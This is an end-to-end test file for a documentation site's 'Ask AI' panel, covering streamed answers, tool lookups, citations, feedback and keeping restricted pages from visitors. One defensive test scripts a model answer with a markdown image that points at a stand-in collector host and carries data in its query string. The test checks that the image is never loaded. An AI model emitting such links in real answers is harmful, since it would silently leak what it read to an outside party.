import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { join, resolve } from "node:path";
import { execFileSync } from "node:child_process";
import { expect as browserExpect, type Browser, type Page } from "@playwright/test";
import type { LlmPort, ModelTurn } from "@pandocs/core";
import { afterAll, beforeAll, expect, it } from "vitest";
import { usePostgresFixture } from "../../packages/core/test/postgres.js";
import { listen } from "../../packages/server/src/listen.js";
import { signInFirstAdmin, startServer, type Client, type TestServer } from "../../packages/server/test/support.js";
import { enterForWord, launchBrowser, pandocsDescribe, startPandocs } from "./fixture.js";

const postgres = usePostgresFixture();
const SPACE = "guide";
const ENGLISH = "en-US";
const ROOT = resolve(import.meta.dirname, "../..");

type Scripted = ModelTurn | "hang" | Error;
const say = (text: string): ModelTurn => ({ text, calls: [] });
const look = (name: string, input: unknown): ModelTurn => ({
  text: "Let me look that up.",
  calls: [{ id: `${name}-1`, name, input }]
});

pandocsDescribe("asking the documents, and telling them what was wrong", () => {
  let app: Awaited<ReturnType<typeof startPandocs>>;
  const scripts = new Map<string, Scripted[]>();
  const asked: { history: readonly { role: string; text: string }[]; system: string }[] = [];

  /** A model that follows a script for each question, the way a real one would take a while over each turn. */
  const conversation: NonNullable<LlmPort["conversation"]> = async ({ history, system, signal }) => {
    asked.push({ history, system });
    const script = [...(scripts.get(history.at(-1)!.text) ?? [say("I do not know.")])];
    return {
      async turn({ onText }) {
        const next = script.shift() ?? say("I do not know.");
        if (next === "hang")
          await new Promise((_, reject) => signal.addEventListener("abort", () => reject(new Error("stopped"))));
        if (next instanceof Error) throw next;
        const turn = next as ModelTurn;
        for (const word of turn.text.split(/(?<= )/u)) {
          onText(word);
          await new Promise(done => setTimeout(done, 15));
        }
        return turn;
      },
      answerCalls: () => undefined,
      finish: async () => undefined
    };
  };

  const panel = (page: Page) => page.getByRole("complementary", { name: "Ask AI" });
  const question = async (page: Page, words: string) => {
    await page.getByRole("button", { name: "Ask AI", exact: true }).click();
    await panel(page).getByRole("textbox", { name: "Ask a question" }).fill(words);
    await panel(page).getByRole("textbox", { name: "Ask a question" }).press("Enter");
  };

  beforeAll(async () => {
    app = await startPandocs(postgres.getConnectionString(), {
      llm: { complete: async () => "", assist: async () => "", conversation }
    });
    await app.api("admin", "POST", "spaces", { slug: SPACE, name: "Guide", defaultRole: "viewer" });
    await app.api("admin", "PUT", `spaces/${SPACE}/members`, { subject: "user:e2e-editor", role: "editor" });
    await app.api("editor", "POST", `spaces/${SPACE}/documents`, {
      title: "Returns",
      slug: "returns",
      markdown: "# Returns\n\nWithin seven days.\n\n## Refunds\n\nOn the original card.\n"
    });
    await app.api("editor", "POST", `spaces/${SPACE}/documents`, {
      title: "Shipping",
      slug: "shipping",
      markdown: "# Shipping\n\nTakes a week.\n"
    });
  }, 120_000);

  afterAll(async () => {
    await app?.close();
  });

  it("looks things up where it can be seen, answers as it goes, and links what it cites to the page", async () => {
    // The page being read is the first source, the page found the second, and the section it reads the third.
    scripts.set("How do refunds work?", [
      look("search_pages", { query: "refund" }),
      look("read_page", { source: 2, section: "refunds" }),
      say("Refunds go **on the original card** [3]. Allow a week [3].")
    ]);
    const page = await app.open("reader", `/${SPACE}/shipping`, ENGLISH);
    await question(page, "How do refunds work?");
    await browserExpect(panel(page).getByText("Searched for “refund”")).toBeVisible();
    await browserExpect(panel(page).getByText("Read “Returns”")).toBeVisible();
    await browserExpect(panel(page).locator("strong").getByText("on the original card")).toBeVisible();
    // What it said on the way to looking something up is not part of the answer.
    await browserExpect(panel(page).getByText("Let me look that up.")).toHaveCount(0);
    const citation = panel(page).locator(".pd-ask__cite a").first();
    await browserExpect(citation).toHaveText("1");
    await browserExpect(citation).toHaveAttribute("href", /\/guide\/returns#refunds$/u);
    await browserExpect(
      panel(page).getByRole("list", { name: "Sources" }).getByRole("link", { name: "Returns: Refunds" })
    ).toBeVisible();
    await page.evaluate(() => {
      (window as unknown as { stayed: boolean }).stayed = true;
    });
    await citation.click();
    await browserExpect(page.locator("main").getByText("On the original card.")).toBeVisible();
    // The app moved, with the conversation still next to it.
    expect(await page.evaluate(() => (window as unknown as { stayed?: boolean }).stayed)).toBe(true);
    await browserExpect(panel(page).getByText("How do refunds work?")).toBeVisible();
    expect(asked.at(-1)!.system).toContain("The site is called");
    await page.context().close();
  }, 60_000);

  it("leaves the Enter that picks a word to an input method", async () => {
    scripts.set("退货要多久？", [say("一周。")]);
    const page = await app.open("reader", `/${SPACE}/shipping`, ENGLISH);
    await page.getByRole("button", { name: "Ask AI", exact: true }).click();
    const box = panel(page).getByRole("textbox", { name: "Ask a question" });
    await box.fill("退货要多久？");
    await enterForWord(box);
    await browserExpect(box).toHaveValue("退货要多久？");
    await box.press("Enter");
    await browserExpect(panel(page).getByText("一周。")).toBeVisible();
  });

  it("carries the conversation on, says what it was reading, and starts over when told to", async () => {
    scripts.set("And how long?", [say("Seven days.")]);
    scripts.set("Then what?", [say("Then nothing.")]);
    const page = await app.open("reader", `/${SPACE}/returns`, ENGLISH);
    await question(page, "And how long?");
    await browserExpect(panel(page).getByText("Seven days.")).toBeVisible();
    expect(asked.at(-1)!.system).toContain('"Returns"');
    await panel(page).getByRole("textbox", { name: "Ask a question" }).fill("Then what?");
    await panel(page).getByRole("button", { name: "Send" }).click();
    await browserExpect(panel(page).getByText("Then nothing.")).toBeVisible();
    expect(asked.at(-1)!.history.map(turn => turn.text)).toEqual(["And how long?", "Seven days.", "Then what?"]);
    await panel(page).getByRole("button", { name: "Start over" }).click();
    await browserExpect(panel(page).getByText("Then nothing.")).toHaveCount(0);
    await page.context().close();
  }, 60_000);

  it("shows no picture an answer tries to load, which could carry what it read somewhere else", async () => {
    scripts.set("Leak it", [
      say(
        "Here you go ![secret](https://collector.example.test/leak.png?data=seven) and [a link](https://example.test/page)."
      )
    ]);
    const page = await app.open("reader", `/${SPACE}/returns`, ENGLISH);
    const requests: string[] = [];
    page.on("request", request => {
      if (request.url().includes("example.test")) requests.push(request.url());
    });
    await question(page, "Leak it");
    await browserExpect(panel(page).getByRole("link", { name: "a link" })).toBeVisible();
    await browserExpect(panel(page).locator("img")).toHaveCount(0);
    expect(requests).toEqual([]);
    await page.context().close();
  }, 60_000);

  it("can be stopped, says so when it fails, and can be asked again", async () => {
    scripts.set("Take forever", ["hang"]);
    const page = await app.open("reader", `/${SPACE}/returns`, ENGLISH);
    await question(page, "Take forever");
    await browserExpect(panel(page).getByText("Looking through the documents…")).toBeVisible();
    await panel(page).getByRole("button", { name: "Stop" }).click();
    await browserExpect(panel(page).getByText("Stopped.")).toBeVisible();

    const { PandocsError } = await import("@pandocs/core");
    scripts.set("Break", [new PandocsError(502, "LLM_FAILED", "The model is temporarily unavailable")]);
    await panel(page).getByRole("textbox", { name: "Ask a question" }).fill("Break");
    await panel(page).getByRole("button", { name: "Send" }).click();
    await browserExpect(panel(page).getByText("The model is temporarily unavailable")).toBeVisible();
    scripts.set("Break", [say("Better now.")]);
    await panel(page).getByRole("button", { name: "Ask again" }).last().click();
    await browserExpect(panel(page).getByText("Better now.")).toBeVisible();
    await page.context().close();
  }, 60_000);

  it("shares its side of the page with the discussions, one at a time", async () => {
    const page = await app.open("commenter", `/${SPACE}/returns`, ENGLISH);
    await page.getByRole("button", { name: "Ask AI", exact: true }).click();
    await browserExpect(panel(page)).toBeVisible();
    await page
      .getByRole("button", { name: /^Comments?\b/u })
      .first()
      .click();
    await browserExpect(panel(page)).toHaveCount(0);
    await browserExpect(page.locator(".pd-panel")).toHaveCount(1);
    await page.getByRole("button", { name: "Ask AI", exact: true }).click();
    await browserExpect(panel(page)).toBeVisible();
    await browserExpect(page.locator(".pd-panel")).toHaveCount(1);
    await page.keyboard.press("Escape");
    await browserExpect(panel(page)).toHaveCount(0);
    await page.context().close();
  }, 60_000);

  it("takes a vote and words at the end of a page, and remembers it was given", async () => {
    const page = await app.open("reader", `/${SPACE}/returns`, ENGLISH);
    const feedback = page.locator(".pd-page-feedback");
    await browserExpect(feedback.getByText("Was this page helpful?")).toBeVisible();
    await feedback.getByRole("button", { name: "No" }).click();
    await feedback.getByLabel("Thanks. What was missing or wrong?").fill("It does not say where to send things.");
    await feedback.getByRole("button", { name: "Send" }).click();
    await browserExpect(feedback.getByText("Thanks for telling us.")).toBeVisible();
    await page.reload();
    await browserExpect(page.locator(".pd-page-feedback").getByText("Thanks for telling us.")).toBeVisible({
      timeout: 15_000
    });
    // Not on the tools for a page.
    await page.goto(`${app.origin}/${SPACE}/returns?view=source`);
    await browserExpect(page.getByText("Markdown source", { exact: false })).toBeVisible({ timeout: 15_000 });
    await browserExpect(page.locator(".pd-page-feedback")).toHaveCount(0);
    await page.context().close();
  }, 60_000);

  it("shows those who look after the documents how they are doing, and lets them deal with what was said", async () => {
    // Reading counts when the page is open in a browser, and a search once someone stops typing.
    const reader = await app.open("reader", `/${SPACE}/returns`, ENGLISH);
    await reader.getByRole("button", { name: "Search" }).first().click();
    await reader.getByRole("textbox").first().fill("zzznothinglikethis");
    await reader.waitForTimeout(2200);
    await reader.context().close();
    await app.api("reader", "POST", "stats/searches", { term: "refunds", results: 3, space: SPACE });

    const page = await app.open("editor", `/_/spaces/${SPACE}/insights`, ENGLISH);
    await browserExpect(page.getByRole("heading", { name: "Guide: insights" })).toBeVisible({ timeout: 15_000 });
    const pages = page.locator("table.pd-table");
    await browserExpect(pages.getByRole("link", { name: "Returns" })).toBeVisible();
    await page.getByRole("button", { name: "Searches" }).click();
    await browserExpect(page.getByRole("heading", { name: "What the documents did not have" })).toBeVisible();
    await browserExpect(page.locator("table.pd-table").first().getByText("zzznothinglikethis")).toBeVisible();
    await browserExpect(page.locator("table.pd-table").last().getByText("refunds")).toBeVisible();
    await page.getByRole("button", { name: "Questions to AI" }).click();
    await browserExpect(page.getByText("How do refunds work?", { exact: false })).toBeVisible();
    await page.getByRole("button", { name: "Feedback", exact: true }).click();
    const said = page.locator(".pd-feedback").filter({ hasText: "It does not say where to send things." });
    await browserExpect(said).toBeVisible();
    await said.getByRole("button", { name: "Mark as dealt with" }).click();
    await browserExpect(said).toHaveCount(0);
    await page.getByRole("button", { name: "Dealt with" }).click();
    await browserExpect(
      page.locator(".pd-feedback").filter({ hasText: "It does not say where to send things." })
    ).toBeVisible();
    await page.context().close();
  }, 60_000);

  it("gets what was said in front of whoever wrote the page", async () => {
    const page = await app.open("editor", "/_/inbox", ENGLISH);
    await browserExpect(page.getByText("gave feedback", { exact: false }).first()).toBeVisible({ timeout: 15_000 });
    await browserExpect(
      page.getByText("It does not say where to send things.", { exact: false }).first()
    ).toBeVisible();
    await page.context().close();
  }, 60_000);

  it("is not offered to someone whose site has no model", async () => {
    const plain = await startPandocs(postgres.getConnectionString());
    await plain.api("admin", "POST", "spaces", { slug: SPACE, name: "Guide", defaultRole: "viewer" });
    await plain.api("admin", "POST", `spaces/${SPACE}/documents`, {
      title: "Page",
      slug: "page",
      markdown: "Words.\n"
    });
    const page = await plain.open("reader", `/${SPACE}/page`, ENGLISH);
    await browserExpect(page.getByText("Words.")).toBeVisible({ timeout: 15_000 });
    await browserExpect(page.getByRole("button", { name: "Ask AI", exact: true })).toHaveCount(0);
    await plain.close();
  }, 120_000);
});

/** The whole way through for real: a browser with no login, the server, and a model service over HTTP. */
pandocsDescribe("asking on a public site", () => {
  let server: TestServer;
  let admin: Client;
  let http: ReturnType<typeof listen>;
  let origin = "";
  let browser: Browser;
  let model: Server;
  const received: { messages: { role: string; content: string }[] }[] = [];

  const chunk = (body: object) => `data: ${JSON.stringify(body)}\n\n`;

  beforeAll(async () => {
    // A service speaking the common protocol, which takes its time between two parts of the answer.
    model = createServer((request, response) => {
      const parts: Buffer[] = [];
      request.on("data", part => parts.push(part as Buffer));
      request.on("end", () => {
        const body = JSON.parse(Buffer.concat(parts).toString()) as { messages: { role: string; content: string }[] };
        received.push(body);
        response.writeHead(200, { "content-type": "text/event-stream" });
        if (!body.messages.some(message => message.role === "tool")) {
          response.end(
            chunk({
              choices: [
                {
                  delta: {
                    tool_calls: [
                      {
                        index: 0,
                        id: "call_1",
                        function: { name: "search_pages", arguments: '{"query":"seven days"}' }
                      }
                    ]
                  },
                  finish_reason: "tool_calls"
                }
              ]
            }) + "data: [DONE]\n\n"
          );
          return;
        }
        response.write(chunk({ choices: [{ delta: { content: "Within seven days " } }] }));
        setTimeout(() => {
          response.end(
            chunk({ choices: [{ delta: { content: "[1]." }, finish_reason: "stop" }] }) + "data: [DONE]\n\n"
          );
        }, 800);
      });
    });
    await new Promise<void>(done => model.listen(0, "127.0.0.1", done));
    execFileSync("pnpm", ["--filter", "@pandocs/web", "build"], { cwd: ROOT, stdio: "ignore" });
    server = await startServer(postgres.getConnectionString(), {
      PANDOCS_WEB_DIR: join(ROOT, "packages/web/dist"),
      PANDOCS_LLM_API_KEY: "test-key",
      PANDOCS_LLM_MODEL: "test-model",
      PANDOCS_LLM_BASE_URL: `http://127.0.0.1:${(model.address() as AddressInfo).port}/v1`
    });
    admin = await signInFirstAdmin(server);
    await new Promise<void>(done => {
      http = listen(server.app, { hostname: "127.0.0.1", port: 0 }, info => {
        origin = `http://127.0.0.1:${info.port}`;
        done();
      });
    });
    await admin.json("POST", "/api/v1/spaces", { slug: "shop", name: "Shop", defaultRole: "none" });
    await admin.json("POST", "/api/v1/spaces/shop/documents", {
      title: "Returns",
      slug: "returns",
      markdown: "Within seven days of delivery.\n"
    });
    await admin.json("POST", "/api/v1/spaces/shop/documents", {
      title: "Secret",
      slug: "secret",
      markdown: "Within seven days of delivery we pay nothing.\n",
      restricted: true
    });
    await admin.json("PATCH", "/api/v1/spaces/shop", { publicRead: true });
    browser = await launchBrowser();
  }, 240_000);

  afterAll(async () => {
    await browser?.close();
    if (http) await new Promise(done => http.close(done));
    await server?.close();
    if (model) await new Promise(done => model.close(done));
  });

  const openAsVisitor = async () => {
    const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, locale: ENGLISH });
    const page = await context.newPage();
    await page.goto(`${origin}/shop/returns`);
    await page.waitForFunction(() => document.documentElement.dataset.live === "");
    return page;
  };

  it("is closed to visitors until the site opens it, and offers to sign in for it", async () => {
    const page = await openAsVisitor();
    await page.getByRole("button", { name: "Ask AI", exact: true }).click();
    await browserExpect(
      page.getByRole("dialog", { name: "Sign in" }).getByText("Sign in to ask the AI about these documents.")
    ).toBeVisible();
    await browserExpect(page.getByRole("complementary", { name: "Ask AI" })).toHaveCount(0);
    const answer = await fetch(`${origin}/api/v1/ask`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: '{"question":"?"}'
    });
    expect(answer.status).toBe(403);
    expect(((await answer.json()) as { error: { code: string } }).error.code).toBe("ASK_CLOSED");
    await page.context().close();
    await admin.json("PATCH", "/api/v1/site", { askForVisitors: true });
  }, 60_000);

  it("comes back piece by piece, through everything in between", async () => {
    // Visitors share the list of what the site offers for a few seconds.
    await expect
      .poll(
        async () =>
          (
            await fetch(`${origin}/api/v1/ask`, {
              method: "POST",
              headers: { "content-type": "application/json" },
              body: '{"question":"?"}'
            })
          ).status,
        { timeout: 15_000, interval: 1000 }
      )
      .toBe(200);
    const response = await fetch(`${origin}/api/v1/ask`, {
      method: "POST",
      headers: { "content-type": "application/json", "accept-encoding": "gzip, br" },
      body: '{"question":"How long?"}'
    });
    expect(response.headers.get("content-type")).toContain("text/event-stream");
    expect(response.headers.get("content-encoding")).toBeNull();
    const reader = response.body!.getReader();
    const decoder = new TextDecoder();
    let text = "";
    let firstWordsAt = 0;
    while (true) {
      const { value, done } = await reader.read();
      if (done) break;
      text += decoder.decode(value, { stream: true });
      if (!firstWordsAt && text.includes("Within seven days")) firstWordsAt = Date.now();
    }
    const finishedAt = Date.now();
    expect(finishedAt - firstWordsAt).toBeGreaterThan(400);
    expect(text).toContain('"type":"done"');
    expect(text).toContain("/shop/returns");
    expect(text).not.toContain("/shop/secret");
    // What went to the model is what a visitor can read.
    const lastRequest = JSON.stringify(received.at(-1));
    expect(lastRequest).toContain("Returns");
    expect(lastRequest).not.toContain("Secret");
    expect(lastRequest).not.toContain("we pay nothing");
  }, 60_000);

  it("answers a visitor in the page, cited, with no errors along the way", async () => {
    // What the site offers visitors is shared for a few seconds. Until then their button asks them to sign in, and is no toggle.
    await expect
      .poll(
        async () =>
          /class="pd-ask-button"[^>]*aria-pressed/u.test(
            await (await fetch(`${origin}/shop/returns`, { headers: { "accept-language": "en" } })).text()
          ),
        { timeout: 15_000, interval: 1000 }
      )
      .toBe(true);
    const page = await openAsVisitor();
    const problems: string[] = [];
    page.on("pageerror", error => problems.push(error.message));
    page.on("console", message => {
      if (message.type() === "error" && !message.text().includes("401")) problems.push(message.text());
    });
    await page.getByRole("button", { name: "Ask AI", exact: true }).click();
    const panel = page.getByRole("complementary", { name: "Ask AI" });
    await panel.getByRole("textbox", { name: "Ask a question" }).fill("How long do I have?");
    await panel.getByRole("button", { name: "Send" }).click();
    await browserExpect(panel.locator(".pd-ask__cite a")).toHaveAttribute("href", /\/shop\/returns$/u, {
      timeout: 15_000
    });
    await panel.getByRole("button", { name: "This helped" }).click();
    await browserExpect(panel.getByRole("button", { name: "This helped" })).toHaveAttribute("aria-pressed", "true");
    expect(problems).toEqual([]);
    await page.context().close();
    const { data } = await admin.json("GET", "/api/v1/spaces/shop/insights");
    expect(data.questions.find((row: { question: string }) => row.question === "How long do I have?")).toMatchObject({
      answered: true,
      helpful: true
    });
    // A visitor's reading counted, without anything saying who.
    expect(data.pages.find((row: { title: string }) => row.title === "Returns").people).toBeGreaterThan(0);
  }, 60_000);

  it("counts what fetches a page's Markdown as a program", async () => {
    const before = (await admin.json("GET", "/api/v1/spaces/shop/insights")).data.totals.agents;
    await fetch(`${origin}/shop/returns.md`);
    await fetch(`${origin}/shop/returns`, { headers: { accept: "text/markdown" } });
    await fetch(`${origin}/shop/returns`, { headers: { "user-agent": "Mozilla/5.0 (compatible; GPTBot/1.2)" } });
    await fetch(`${origin}/shop/returns`, { headers: { "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1)" } });
    expect((await admin.json("GET", "/api/v1/spaces/shop/insights")).data.totals.agents).toBe(before + 3);
  }, 60_000);
});
